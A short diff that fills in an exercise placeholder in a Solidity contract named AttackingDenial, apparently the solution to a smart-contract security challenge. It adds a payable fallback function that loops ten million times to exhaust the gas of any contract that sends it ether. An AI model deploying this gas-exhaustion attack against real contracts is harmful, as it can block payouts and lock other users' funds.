@@ -9,5 +9,12 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    // this gets called when the contract receives ether
+    fallback() external payable {
+        uint j;
+        // create a function that costs a lot of gas to calculate
+        for (uint i = 0; i < 10000000; i++) {
+            j = (i * i) / 10000;
+        }
+    }
 }
